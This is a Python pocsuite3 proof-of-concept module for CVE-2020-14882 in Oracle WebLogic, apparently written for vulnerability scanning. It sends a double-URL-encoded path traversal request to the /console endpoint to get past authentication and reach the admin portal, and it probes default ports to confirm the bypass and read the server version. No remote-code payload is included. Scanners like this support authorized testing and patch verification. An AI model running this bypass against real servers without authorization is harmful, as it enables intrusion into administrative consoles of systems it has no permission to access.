#!/usr/bin/env python
# coding: utf-8
import re
import time
from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class TestPOC(POCBase):
    vulID = '0'
    version = '1.0'
    author = 'hancool'
    vulDate = '2020-10-21'
    createDate = '2020-11-2'
    updateDate = '2020-11-2'
    references = [
        'https://www.oracle.com/security-alerts/cpuoct2020traditional.html',
        'https://github.com/jas502n/CVE-2020-14882'
    ]
    name = 'CVE-2020–14882 Weblogic Unauthorized bypass RCE'
    appPowerLink = 'https://www.oracle.com/middleware/weblogic/index.html'
    appName = 'WebLogic'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
    Oracle Fusion Middleware（Oracle融合中间件）是美国甲骨文（Oracle）公司的一套面向企业和云环境的业务创新平台。该平台提供了中间件、软件集合等功能。Oracle WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。
    Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Console). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server.    影响产品：10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0
    '''

    def _verify(self):
        headers = {
            'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)'}

        def check_console(target):
            if not target.startswith('http'):
                target = 'http://{}'.format(target)
            url = '{}/console/'.format(target)
            try:
                r = req.get(url, headers=headers, verify=False, timeout=5)
                if r.status_code == req.codes.ok:
                    if 'Deploying application for /console/...' in r.text:
                        time.sleep(2)
                    return (True, r.text.strip())
                elif r.status_code == 404:
                    return (False, '404')
                else:
                    return (False, r.status_code)
            except req.exceptions.ReadTimeout:
                return (False, 'timeout')
            except Exception as ex:
                # raise
                return (False, str(ex))

        def check_weblogic_console_page(target):
            s = req.session()
            console_url = '/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1'
            if not target.startswith('http'):
                target = 'http://{}'.format(target)
            url = '{}{}'.format(target, console_url)
            try:
                # get session cookes
                r = s.get(url, allow_redirects=False)
                # 302 to portal
                if r.status_code == 302:
                    r = s.get(url)
                    if r.status_code == 200 and 'id="HomePage1"' in r.text:
                        m = re.findall(
                            '<p id="footerVersion">(.*?)</p>', r.text)
                        if m:
                            return (True, m[0])
                        else:
                            return(True, '')
                return (False, '')
            except req.exceptions.ReadTimeout:
                return (False, 'timeout')
            except Exception as ex:
                # raise
                return (False, str(ex))
        '''
        verify:
        '''
        result = {}
        pr = urlparse(self.url)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [7001, 17001, 27001]
        for port in ports:
            uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
            status, msg = check_console(uri)
            if status:
                status, msg = check_weblogic_console_page(uri)
                if status:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = uri
                    result['extra'] = {}
                    result['extra']['evidence'] = msg
                    break

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
